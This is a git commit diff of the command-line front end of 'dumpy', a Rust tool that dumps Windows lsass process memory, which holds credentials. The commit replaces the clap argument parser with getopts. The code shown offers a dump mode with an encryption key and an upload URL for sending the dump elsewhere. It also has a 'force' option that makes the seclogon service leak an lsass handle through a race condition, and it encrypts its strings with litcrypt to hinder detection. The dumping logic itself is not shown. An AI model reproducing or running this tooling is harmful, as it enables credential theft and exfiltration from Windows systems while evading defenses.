8de5c2ae6fd67a64f64a84b90b5be73b0f8cdd81
Kudaes <kurosh_2907@hotmail.com>
2023-03-28 13:39:01 +0200

    Claps replaced by getops

--- dumpy/src/main.rs
+++ dumpy/src/main.rs
@@ -2,55 +2,89 @@
 extern crate litcrypt;
 use_litcrypt!();
 
-use clap::{Parser};
+extern crate getopts;
+use std::{env};
+use getopts::Options;
 
 fn main() {
 
     start();
 }
 
-#[derive(Parser,Default,Debug)]
-struct Arguments {
-    /// Valid values: dump or decrypt
-    action: String,
-    #[clap(default_value="1234abcd",short, long)]
-    /// Encryption key
-    key: String,
-    #[clap(default_value="c:\\temp\\input.txt",short, long)]
-    /// Encrypted dump file
-    input_file: String,
-    #[clap(default_value="c:\\temp\\output.txt",short, long)]
-    /// Destination path
-    output_file: String,
-    /// Upload URL
-    #[clap(short, long)]
-    upload: Option<String>,
-    /// Force seclogon's service to leak a lsass handle through a race condition.
-    force:Option<String>
+fn print_usage(program: &str, opts: Options) {
+    let brief = format!("Usage: {} --dump|--decrypt [options]", program);
+    print!("{}", opts.usage(&brief));
 }
 
 fn start() {
 
-    let args = Arguments::parse();
     let mut force = false;
     let mut upload = "".to_string();
-    if args.action == lc!("dump")
-    {
-        if args.upload != None
-        {
-            upload = args.upload.unwrap();
-        }
+    let mut key = lc!("1234abcd");
+    let mut output = lc!("c:\\temp\\output.txt");
+    let mut input = lc!("c:\\temp\\input.txt");
 
-        if args.force != None
+    let args: Vec<String> = env::args().collect();
+    let program = args[0].clone();
+    let mut opts = Options::new();
+    opts.optflag("h", "help", "Print this help menu.");
+    opts.optflag("", "dump", "Dump lsass.");
+    opts.optflag("", "decrypt", "Decrypt a previously generated dump file.");
+    opts.optflag("f", "force", "Force seclogon's service to leak a lsass handle through a race condition.");
+    opts.optopt("k", "key", "Encryption key [default: 1234abcd]", "");
+    opts.optopt("i", "input", r"Encrypted dump file [default: c:\temp\input.txt]", "");
+    opts.optopt("o", "output", r"Destination path [default: c:\temp\output.txt]", "");
+    opts.optopt("u", "upload", "Upload URL", "");
+
+
+    let matches = match opts.parse(&args[1..]) {
+        Ok(m) => { m }
+        Err(_) => {print!("{}",lc!("[x] Invalid arguments. Use -h for detailed help.")); return; }
+    };
+
+    if matches.opt_present("h") {
+        print_usage(&program, opts);
+        return;
+    }
+
+    if matches.opt_present(&lc!("dump"))
+    {
+
+        if matches.opt_present("u")
+        {
+            upload = matches.opt_str("u").unwrap();
+        }
+        if matches.opt_present("f")
         {
             force = true;
         }
+        if matches.opt_present("k")
+        {
+            key = matches.opt_str("k").unwrap();
+        }
         
-        dumper::dump(&args.key, &upload, force);
+        dumper::dump(&key, &upload, force);
+
     }
-    else if args.action == lc!("decrypt")
+    else if matches.opt_present(&lc!("decrypt"))
     {
-        dumper::decrypt(&args.input_file, &args.key, &args.output_file);
+
+        if matches.opt_present("i")
+        {
+            input = matches.opt_str("i").unwrap();
+
+        }
+        if matches.opt_present("o")
+        {
+            output = matches.opt_str("o").unwrap();
+        }
+        if matches.opt_present("k")
+        {
+            key = matches.opt_str("k").unwrap();
+        }
+        
+        dumper::decrypt(&input, &key, &output);
+
     }
     else
     {
